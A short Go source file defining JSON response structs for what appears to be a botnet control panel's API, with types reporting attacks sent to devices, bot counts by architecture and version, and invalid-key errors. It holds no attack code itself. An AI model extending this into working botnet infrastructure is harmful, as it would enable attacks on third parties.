package routes

type Error struct {
	Code    int    `json:"status_code"`
	Message string `json:"message"`
}

type AttackSent struct {
	Code          int `json:"status_code"`
	DevicesSentTo int `json:"command_sent_to"`
}

type Distribution struct {
	Arch       map[string]int `json:"arch"`
	Identifier map[string]int `json:"identifier"`
	Version    map[string]int `json:"version"`
}

type BotCount struct {
	Types *Distribution `json:"distribution"`
	Total int           `json:"total"`
}

var (
	ErrInvalidKey = &Error{
		Code:    403,
		Message: "api key invalid",
	}

	ErrInvalidMethod = &Error{
		Code:    405,
		Message: "request method is invalid",
	}
)
